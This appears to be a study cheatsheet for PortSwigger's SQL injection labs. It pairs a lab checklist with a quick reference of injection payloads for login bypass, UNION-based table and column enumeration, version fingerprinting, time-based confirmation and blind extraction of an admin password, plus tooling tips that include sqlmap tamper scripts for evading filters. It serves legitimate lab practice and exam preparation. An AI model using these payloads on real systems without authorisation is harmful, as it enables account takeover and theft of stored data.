# PortSwigger Labs Mapping & Quick Payload Cheatsheet

> Use this as the fast-reference file during practice sessions — full theory lives in the
> other files. This is the "open this tab while doing labs" file.

---

## 1. Full Lab Checklist (Web Security Academy → SQL Injection)

Tick these off as you redo them:

**Retrieving hidden data**
- [ ] SQL injection vulnerability allowing retrieval of hidden data

**UNION attacks**
- [ ] SQL injection UNION attack, determining the number of columns returned
- [ ] SQL injection UNION attack, finding a column containing text
- [ ] SQL injection UNION attack, retrieving data from other tables
- [ ] SQL injection UNION attack, retrieving multiple values in a single column

**Examining the database**
- [ ] SQL injection attack, querying the database type and version on Oracle
- [ ] SQL injection attack, querying the database type and version on MySQL and Microsoft
- [ ] SQL injection attack, listing the database contents on non-Oracle databases
- [ ] SQL injection attack, listing the database contents on Oracle

**Blind SQL injection**
- [ ] Blind SQL injection with conditional responses
- [ ] Blind SQL injection with conditional errors
- [ ] Blind SQL injection with time delays
- [ ] Blind SQL injection with time delays and information retrieval
- [ ] Blind SQL injection with out-of-band interaction
- [ ] Blind SQL injection with out-of-band data exfiltration
- [ ] Blind SQL injection with hidden data in HTTP headers

**Other**
- [ ] SQL injection with filter bypass via XML encoding
- [ ] Second-order SQL injection
- [ ] SQL injection attack, conditional errors used to enumerate columns (if present in
  current lab list — naming changes occasionally, re-check the academy index)

> Lab names/order occasionally get updated by PortSwigger — always cross-check the live
> "All labs" page under Web Security Academy → SQL injection before a session, in case
> new labs were added since this note was written.

---

## 2. Quick Payload Reference by Goal

**Break out of a string context:**
```sql
'
"
')
")
```

**Confirm boolean injection:**
```sql
' AND '1'='1
' AND '1'='2
```

**Confirm time-based injection:**
```sql
' AND SLEEP(5)--          (MySQL)
'; WAITFOR DELAY '0:0:5'--  (MSSQL)
' AND pg_sleep(5)--         (Postgres)
```

**Comment out rest of query:**
```sql
--      (needs trailing space in MySQL: "-- ")
#       (MySQL only)
/* */   (all engines, inline)
```

**Bypass login form (classic):**
```sql
' OR '1'='1
' OR 1=1--
admin'--
admin' #
```

**Determine column count:**
```sql
' ORDER BY 1--
' UNION SELECT NULL,NULL,NULL--
```

**Get DB version:**
```sql
' UNION SELECT @@version,NULL--          (MySQL/MSSQL)
' UNION SELECT banner,NULL FROM v$version-- (Oracle)
' UNION SELECT version(),NULL--           (Postgres)
```

**List tables / columns (information_schema-based engines):**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

**Extract via boolean blind (binary search ASCII):**
```sql
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>77--
```

---

## 3. Tooling Reference

| Tool | Use For |
|---|---|
| Burp Repeater | Manual confirmation, building payloads step by step |
| Burp Intruder | Automating boolean/time-based character extraction |
| Burp Collaborator / interactsh | Out-of-band confirmation and exfiltration |
| sqlmap | Automating full extraction once injection is confirmed manually |
| `--tamper` scripts (sqlmap) | WAF/filter evasion once a base payload is blocked |

> Lab discipline note: prove injection manually first, automate second. On the exam
> (and on real engagements) you need to be able to explain *why* a payload works without
> relying on sqlmap to think for you.

---

## 4. Session Checklist Before Closing Out a Practice Session

- [ ] Did I identify the DB engine for this lab/target before exploiting?
- [ ] Did I confirm injection with a minimal payload before jumping to extraction?
- [ ] Did I note the exact working payload + why it worked (for the reference doc)?
- [ ] Did I check if a second-order angle exists, even in single-form labs (good habit
  for real engagements even when the lab itself doesn't require it)?
- [ ] Did I record the lab name + technique in this checklist?

---

Continue to → `07_SQLMap_Complete_Guide.md`
